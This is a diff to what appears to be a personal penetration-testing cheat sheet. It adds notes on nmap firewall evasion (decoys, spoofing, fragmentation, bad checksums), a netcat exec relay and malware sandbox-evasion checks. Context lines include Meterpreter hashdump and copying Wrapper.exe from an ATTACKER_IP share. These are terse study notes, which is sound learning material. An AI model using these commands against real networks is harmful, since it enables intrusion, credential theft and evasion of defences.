@@ -19,10 +19,16 @@
 - [Code Analyse](#code-analyse)
 - [METASPLOIT](#metasploit)
   - [msfvenom](#msfvenom)
-  - [Meterpreter](#meterpreter)
-  - [Metasploit with database](#metasploit-with-database)
-    - [NMAP - DB\_NMAP](#nmap---db_nmap)
-- [Memory Dump](#memory-dump)
+    - [Meterpreter](#meterpreter)
+    - [Metasploit with database](#metasploit-with-database)
+- [Port Scanning (NMAP - DB\_NMAP - Socat)](#port-scanning-nmap---db_nmap---socat)
+  - [Firewal Evasion](#firewal-evasion)
+    - [Routes](#routes)
+    - [Fragmentation/MTU/Size](#fragmentationmtusize)
+  - [Port Forwarding](#port-forwarding)
+  - [Summary](#summary)
+  - [Sandbox Evasion](#sandbox-evasion)
+- [Memory Dump (more learn)](#memory-dump-more-learn)
 
 
 # Linux
@@ -217,7 +223,6 @@
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
   -  smbclient -U USER '//IP/folder'
 
-
 ## DNS, SMB, SNMP
 - dig
   - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
@@ -276,7 +281,7 @@
   - -i interation
 
 
-## Meterpreter
+### Meterpreter
 - sysinfo
 - getpid
 - hashdump (migrate to process first)
@@ -286,8 +291,7 @@
 - search
 
 
-## Metasploit with database
-
+### Metasploit with database
 - Basic usage
   - use handler/multi
   - set payload
@@ -304,13 +308,14 @@
 - workspace -d (delete)
 - workspace name (move to name)
 
-### NMAP - DB_NMAP
-- db_nmap | nmap
+# Port Scanning (NMAP - DB_NMAP - Socat)
+- db_nmap (for metasploit) | nmap
 - Scripts
   - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
     - https://www.exploit-db.com/
     - https://nvd.nist.gov/vuln/full-listing
   - -sC: other common scripts
+  - Search script: **locate -r nse$ | grep NAME**
   
 - Basic scans
   - -sS (Syn), -sA(Ack), -sU (UDP)
@@ -318,38 +323,14 @@
     - -sV -O -sC [default scripts] --traceroute
   - -sV: version of services found
   - -p-: all ports
-  - -g 123 / --source-port 123 ==> all trafic from the specific port number
-    - UPD 53 - dns
-    - TCP 80 - http
-  - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
   - -Pn: no ping
-  - --spoof-mac [MAC]
+  - -e INTERFACE
+  - -PN no ping
   
-- Size and intensitiy
-  - -T[0-5] = Control speed
-  - -F = faster
-  -  -f = 8 bytes / -ff 16 byes = fragmentation
-  - --mtu 128 = custom size
-
-- Route
-  - --ip-options "L IP IP" = loose route packets routed to L IP
-  - --ip-options "S IP IP" = strict route, every hope defined
-  - --proxies proto://host:port,proto://host:port
-    - HTTP:HOST1:PORT,SOCKS4://HOST2:Port
-
 - Output
   - --reason / -v / -vv / -d / -dd
   - -oN = normal output
   - -oG = grep output
-
-- Invalid packets
-  - --badsum = alterad package
-  - --scanflags URG,ACK,PSH,RST,SYN,FYN {SYNRSTFIN}
-  - Alternative
-    - hping3
-      - -t time to live
-      - -b badsum
-      - -S,-A,-P-U-F-R
 
 - hosts: list hosts from db
   - -a: add
@@ -360,10 +341,97 @@
  - From services google for vulnerabilities /also search in metasploit
  - Common services: http, ftp, smb, ssh, rdp
 
-- Search script
-  - locate -r nse$ | grep NAME
+## Firewal Evasion
+- Stateless: individual package
+- Statefull: stablished TCP session (all related packets)
+- NGFW: application layer
 
-# Memory Dump
+### Routes 
+- Controll source MAC/IP/PORT
+- Proxy
+  - --proxies proto://host:port,proto://host:port
+    - HTTP:HOST1:PORT,SOCKS4://HOST2:Port
+    - --proxies IP target
+  
+- Spoofed address (MAC, IP)
+  - --spoof-mac MAC_ADDRESS (spoof mac - same network segment)
+  - -S IP (spoof address - same network)
+  
+- Decoy: random address
+  - -D ip,ip,ip,ip,ME
+  - -D RMD,RND,RND,ME
+  
+- Fixed Port
+  - -g 123 / --source-port 123 ==> all trafic from the specific port number
+  - UPD 53 - dns (looks like dns query)
+  - TCP 80 - http (looks like from web server)
+
+### Fragmentation/MTU/Size 
+- Size and intensitiy
+  - -T[0-5] = Control speed
+  - -F = faster
+  -  -f = 8 bytes / -ff 16 byes = fragmentation
+  - --mtu 128 = custom size
+  - --data-length VALUE
+
+- Headers (TTL, IP options, checksum)
+  - --ttl # 
+  - --ip-options HEX
+    - R, T, U ,L ,S 
+    - R = record-route
+    - T = record timestamp
+    - U = route and timestamp
+    - L = loose source
+    - S = strict source
+    - "L IP IP" = loose route packets routed to L IP
+    - "S IP IP" = strict route, every hope defined
+
+- Invalid packets
+  - --badsum = alterad package
+  - --scanflags URG,ACK,PSH,RST,SYN,FYN {SYNRSTFIN}
+  - Alternative
+    - hping3
+      - -t time to live
+      - -b badsum
+      - -S,-A,-P-U-F-R
+
+## Port Forwarding
+- nc -lvnp 443 -c "nc TARGET PORT"
+  - -c = --sh-exec
+  - -e = --exec
+
+## Summary
+|Approach     |NMAP Command                 |
+|-------------|-----------------------------|
+|Decoy        |-D IP,IP,ME, RND,RND,ME      |
+|Proxy        |--proxies URL,HOST:port      |
+|Spoofed mac  |--spoof-mac MAC              |
+|Spoofed ip   |-S IP                        |
+|Src Port     |-g PORT, --source-port PORT  |
+|Fragment     |-f 8 bytes, -ff 18 bytes     |
+|MTU          |--mtu #                      |
+|Lenght packet|--data-length #              | 
+|TTL          |--ttl #                      |
+|IP options   |-ip-options RTULS            |
+|bad sum      |--badsum                     |
+
+## Sandbox Evasion
+- Sleeping / Time Evasion
+  - [Thead based](https://www.joesecurity.org/blog/660946897093663167#)
+  - [Evasions Timing](https://evasions.checkpoint.com/techniques/timing.html)
+- Geolocation: find ISP
+  - [ifconfig me](https://ifconfig.me/) + [ARINS RDAP](https://rdap.apnic.net/ip/1.1.1.1)
+- systeminfo (windows) / lscpu
+  - also: hostanme, Sotrage serial number, BIOS/UEFI version, OS version, Network adaptor, Virtualization checks, Signed user
+- NOT in AD
+  - but collect info
+  - variables
+  - echo %VARIABLE%
+
+**Learn more about it**
+
+
+# Memory Dump (more learn)
 - volatility
   - -f = memory dump file
   - -v = verbosity
